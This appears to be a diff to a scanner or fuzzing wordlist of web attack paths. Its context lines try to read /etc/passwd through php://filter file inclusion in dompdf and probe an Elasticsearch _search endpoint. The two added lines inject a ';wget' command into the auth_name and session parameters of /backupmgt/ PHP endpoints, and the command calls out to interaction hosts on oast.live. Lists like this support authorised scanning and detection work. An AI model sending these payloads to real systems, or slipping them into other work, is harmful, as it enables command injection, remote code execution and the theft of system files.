@@ -8124,3 +8124,5 @@ a
 /lib/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
 /_search?pretty
 /includes/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
+/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://ctu1e2la6l84rsl142k0boj9g4uy654oq.oast.live;
+/backupmgt/localJob.php?session=fail;wget+http://ctu1e2la6l84rsl142k0r4rpy8mqjznum.oast.live;
